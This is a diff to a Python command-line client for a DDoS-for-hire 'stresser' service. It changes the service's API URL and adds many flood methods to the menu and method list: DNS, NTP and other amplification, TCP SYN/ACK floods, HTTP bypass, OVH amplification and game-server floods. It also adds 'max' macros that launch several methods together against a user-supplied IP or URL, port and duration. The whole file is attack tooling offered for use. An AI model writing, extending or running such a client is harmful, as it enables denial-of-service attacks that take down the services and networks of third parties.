@@ -7,17 +7,17 @@ from sty import fg
 
 _USERNAME="larina"
 
-_KEY="KEY_HERE" # key from here >> https://stresser.us/
+_KEY="KEY" # key from here >> https://stresserus.io/
 
-# https://stresser.us/documentation
+# https://stresserus.io/documentation
 _GEO="TH" # geolocation for tcp tfo
-_SUBNET="true" # subnet mode for amp method
-_DALAY=0.5 # wait delay per req
-_METHODS=["DNS","NTP","WSD","DVR","ARD", "TCPMB" ,"HTTPSV3","HTTPSV2","HTTPSV1"]
-_MACRO={ # full power
-    "MAXTCP":["TCPMB"],
-    "MAXUDP":["DNS", "NTP", "WSD", "DVR", "ARD"],
-    "MAXHTTPS":["HTTPSv1", "HTTPSv2", "HTTPSv3"]
+_SUBNET="false" # subnet mode for amp method
+_DALAY=0.5 # delay per request
+_METHODS=["DNS", "NTP", "WSD", "DVR", "ARD", "SADP",  "TCPMB", "TCPSYN", "TCPACK", "TCPTFO", " UDPPPS",  "IPRAND", "ESP", "GRE", "FIVEM", "VALVE",  "HTTPBYPASS", "HTTPSv1", "HTTPSv2",  "OVHAMP"]
+_MACRO={ # idk
+    "MAXTCP":["TCPMB", "TCPSYN", "TCPACK", "TCPTFO"],
+    "MAXUDP":["DNS", "NTP", "WSD", "DVR", "ARD", "SADP"],
+    "MAXHTTPS":["HTTPBYPASS", "HTTPSv1", "HTTPSv2"]
 }
 
 __builtins__.print = lambda text="",end="\r\n": stdout.write(f"{text}{end}");stdout.flush()
@@ -78,13 +78,13 @@ def request(ip,port,time,conn,method):
 def helpcom():
     logo()
     # \t\t {makec("║",_COLOR.line)} {makec("BOTNET",206)}  ║ {makec("> TCPBOT, SYNBOT, UDPBOT, UDPSBOT, OVHBOT",_COLOR.text)}        {makec("║",_COLOR.line)}
-    # \t\t {makec("║",_COLOR.line)} {makec("L3",203)}      ║ {makec("> IPRAND",_COLOR.text)}                                         {makec("║",_COLOR.line)}
-    # \t\t {makec("║",_COLOR.line)} {makec("UDP",197)}     ║ {makec("> UDPRAW, UDPPPS",_COLOR.text)}                                 {makec("║",_COLOR.line)}
-    # \t\t {makec("║",_COLOR.line)} {makec("SPECIAL",135)} ║ {makec("> VALVE, FIVEM, OVHAMP",_COLOR.text)}     
     printc(f"""\t\t {makec("╔═════════╦══════════════════════════════════════════════════╗",_COLOR.line)}
-\t\t {makec("║",_COLOR.line)} {makec("AMP",211)}     ║ {makec("> DNS, NTP, WSD, DVR, ARD",_COLOR.text)}                        {makec("║",_COLOR.line)}
-\t\t {makec("║",_COLOR.line)} {makec("TCP",206)}     ║ {makec("> TCPMB",_COLOR.text)}                                          {makec("║",_COLOR.line)}
-\t\t {makec("║",_COLOR.line)} {makec("L7",201)}      ║ {makec("> HTTPSv1, HTTPSv2, HTTPSv3",_COLOR.text)}                      {makec("║",_COLOR.line)}
+\t\t {makec("║",_COLOR.line)} {makec("AMP",211)}     ║ {makec("> DNS, NTP, WSD, DVR, ARD, SADP",_COLOR.text)}                  {makec("║",_COLOR.line)}
+\t\t {makec("║",_COLOR.line)} {makec("TCP",206)}     ║ {makec("> TCPMB, TCPSYN, TCPACK, TCPTFO",_COLOR.text)}                  {makec("║",_COLOR.line)}
+\t\t {makec("║",_COLOR.line)} {makec("UDP",197)}     ║ {makec("> UDPPPS",_COLOR.text)}                                         {makec("║",_COLOR.line)}
+\t\t {makec("║",_COLOR.line)} {makec("L3",203)}      ║ {makec("> IPRAND, ESP, GRE, FIVEM, VALVE",_COLOR.text)}                 {makec("║",_COLOR.line)}
+\t\t {makec("║",_COLOR.line)} {makec("L7",201)}      ║ {makec("> HTTPBYPASS, HTTPSv1, HTTPSv2",_COLOR.text)}                   {makec("║",_COLOR.line)}
+\t\t {makec("║",_COLOR.line)} {makec("SPECIAL",135)} ║ {makec("> OVHAMP",_COLOR.text)}                                         {makec("║",_COLOR.line)}
 \t\t {makec("╚═════════╩══════════════════════════════════════════════════╝",_COLOR.line)}""")
 
 def clearcom():
@@ -108,7 +108,7 @@ def main():
         args=rawcommands[1:]
         # print(commands,_MACRO.get(commands,False))
         if commands in _METHODS or _MACRO.get(commands,False):
-            if (len(args) < 4) or (not ((commands.startswith("HTTPS") or commands.startswith("BROWSER")) or isgoodipv4(args[0])) or (not isgoodint(args[1],65535)) or (not isgoodint(args[2],1200)) or (not isgoodint(args[3],10))):
+            if (len(args) < 4) or (not ((commands.startswith("HTTP") or commands.startswith("BROWSER")) or isgoodipv4(args[0])) or (not isgoodint(args[1],65535)) or (not isgoodint(args[2],1200)) or (not isgoodint(args[3],10))):
                 print(makec(f"[*] {commands} <ip/url> <port> <time> <conn>",99))
             else: 
                 if _MACRO.get(commands,False):
